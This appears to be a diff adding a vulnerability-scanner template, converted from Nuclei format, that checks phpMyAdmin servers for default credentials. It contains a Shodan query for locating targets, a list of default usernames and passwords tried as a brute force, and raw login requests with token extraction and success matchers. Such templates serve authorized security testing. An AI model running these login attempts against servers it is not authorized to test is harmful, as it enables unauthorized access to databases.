@@ -1,0 +1,186 @@
+{
+  "id": "phpmyadmin-default-login",
+  "name": "phpMyAdmin - Default Login",
+  "author": "Natto97,notwhy",
+  "severity": "HIGH",
+  "description": "phpMyAdmin contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.",
+  "references": [
+    "https://www.phpmyadmin.net"
+  ],
+  "tags": [
+    "default-login",
+    "phpmyadmin"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "shodan": "http.title:phpMyAdmin"
+  },
+  "variables": {
+    "user": [
+      "root",
+      "mysql"
+    ],
+    "password": [
+      123456,
+      "root",
+      "mysql",
+      "toor"
+    ]
+  },
+  "variablesType": "clusterbomb",
+  "cweId": "CWE-522",
+  "cvssScore": "8.3",
+  "cvssMetrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /index.php HTTP/1.1\nHost: {{Hostname}}\n",
+        "POST /index.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nCookie: phpMyAdmin\u003d{{token2}}; pma_lang\u003den\n\nset_session\u003d{{session}}\u0026pma_username\u003d{{user}}\u0026pma_password\u003d{{password}}\u0026server\u003d1\u0026route\u003d%2F\u0026token\u003d{{token}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "contains(header_2, \"phpMyAdmin\u003d\") \u0026\u0026 contains(header_2, \"pmaUser-1\u003d\")",
+            "status_code_2 \u003d\u003d 302",
+            "contains(header_2, \u0027index.php?collation_connection\u003dutf8mb4_unicode_ci\u0027) || contains(header_2, \u0027/index.php?route\u003d/\u0026route\u003d%2F\u0027)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "AND",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": true,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "phpmyadmin-default-login",
+    "info": {
+      "name": "phpMyAdmin - Default Login",
+      "author": "Natto97,notwhy",
+      "severity": "high",
+      "description": "phpMyAdmin contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.",
+      "reference": [
+        "https://www.phpmyadmin.net"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L",
+        "cvss_score": "8.3",
+        "cwe_id": "CWE-522"
+      },
+      "metadata": {
+        "max_request": 16,
+        "shodan_query": "http.title:phpMyAdmin"
+      },
+      "tags": "default-login,phpmyadmin"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "user": [
+            "root",
+            "mysql"
+          ],
+          "password": [
+            123456,
+            "root",
+            "mysql",
+            "toor"
+          ]
+        },
+        "attack": "clusterbomb",
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": true,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /index.php HTTP/1.1\nHost: {{Hostname}}\n",
+          "POST /index.php HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nCookie: phpMyAdmin\u003d{{token2}}; pma_lang\u003den\n\nset_session\u003d{{session}}\u0026pma_username\u003d{{user}}\u0026pma_password\u003d{{password}}\u0026server\u003d1\u0026route\u003d%2F\u0026token\u003d{{token}}\n"
+        ],
+        "matchers_condition": "and",
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "contains(header_2, \"phpMyAdmin\u003d\") \u0026\u0026 contains(header_2, \"pmaUser-1\u003d\")",
+              "status_code_2 \u003d\u003d 302",
+              "contains(header_2, \u0027index.php?collation_connection\u003dutf8mb4_unicode_ci\u0027) || contains(header_2, \u0027/index.php?route\u003d/\u0026route\u003d%2F\u0027)"
+            ],
+            "condition": "and"
+          }
+        ],
+        "extractors": [
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "name\u003d\"token\" value\u003d\"([0-9a-z]+)\""
+            ],
+            "group": 1,
+            "name": "token",
+            "internal": true
+          },
+          {
+            "type": "regex",
+            "part": "body",
+            "regex": [
+              "name\u003d\"set_session\" value\u003d\"([0-9a-z]+)\""
+            ],
+            "group": 1,
+            "name": "token2",
+            "internal": true
+          },
+          {
+            "type": "regex",
+            "part": "header",
+            "regex": [
+              "phpMyAdmin(_https)?\u003d([0-9a-z]+)"
+            ],
+            "group": 2,
+            "name": "session",
+            "internal": true
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
